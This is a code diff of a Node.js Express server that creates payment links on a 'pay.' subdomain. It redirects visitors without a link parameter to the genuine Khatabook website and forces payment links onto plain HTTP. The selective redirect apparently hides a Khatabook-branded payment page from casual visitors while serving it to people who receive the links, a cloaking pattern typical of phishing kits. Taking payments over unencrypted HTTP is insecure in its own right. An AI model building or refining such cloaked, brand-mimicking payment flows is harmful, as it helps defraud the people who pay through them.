@@ -43,31 +43,33 @@ app.use(cors({
   methods: ['GET', 'POST']
 }));
 
-// Store current domain for later use in redirects
-let currentDomain = '';
-
-// Add subdomain handling middleware - this must come BEFORE static files middleware
+// Simplify subdomain handling - serve all content regardless of subdomain
 app.use((req, res, next) => {
-  // Get the host from headers
-  const host = req.headers.host || '';
-  currentDomain = host.replace(/^www\./, '').split(':')[0]; // Store domain without www and port
-  
-  // Check if we're on the pay subdomain
-  if (host.startsWith('pay.')) {
-    // Keep the user on the pay subdomain for the entire payment flow
-    // Just serve the content directly rather than redirecting
-    return next();
-  }
-  
+  // Log host information for debugging
+  console.log(`Request host: ${req.headers.host}`);
   next();
 });
 
-// Add this route to redirect direct visitors to khatabook.com
+// Add route to handle root path on pay subdomain
 app.get('/', (req, res, next) => {
-  // Only redirect if it's a direct visit without any query parameters
+  const host = req.headers.host || '';
+  const pid = req.query.pid;
+  
+  // If on pay subdomain with pid parameter
+  if (host.startsWith('pay.') && pid) {
+    return res.redirect(`/landing.html?pid=${pid}`);
+  }
+  
+  // If on pay subdomain without pid, redirect to main site
+  if (host.startsWith('pay.') && !pid) {
+    return res.redirect('http://www.khatabook.com');
+  }
+  
+  // If on main domain with no parameters, redirect to khatabook
   if (!Object.keys(req.query).length) {
     return res.redirect('https://www.khatabook.com');
   }
+  
   next();
 });
 
@@ -84,7 +86,7 @@ const io = new Server(server);
 const transactions = new Map();
 const paymentLinks = new Map();
 
-// Modified Payment Links Endpoint to keep users on the pay subdomain
+// Modified Payment Links Endpoint for simpler subdomain handling
 app.post('/api/generatePaymentLink', (req, res) => {
   try {
     const { amount, description } = req.body;
@@ -99,14 +101,15 @@ app.post('/api/generatePaymentLink', (req, res) => {
 
     const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
     
-    // Force HTTP protocol for the subdomain to avoid SSL issues
+    // Force HTTP protocol to avoid SSL issues
     const protocol = "http";
     
-    // Get the host without any subdomain and port
-    const domain = currentDomain || req.get('host').replace(/^www\./, '').split(':')[0];
+    // Get the current domain
+    const host = req.get('host').replace(/^www\./, '');
+    const domain = host.includes(':') ? host.split(':')[0] : host; // Remove port if present
     
-    // Create payment link with pay subdomain using HTTP
-    const paymentLink = `${protocol}://pay.${domain}/landing.html?pid=${invoiceId}`;
+    // Create payment link with pay subdomain
+    const paymentLink = `${protocol}://pay.${domain}?pid=${invoiceId}`;
 
     paymentLinks.set(invoiceId, {
       amount: parseFloat(amount),
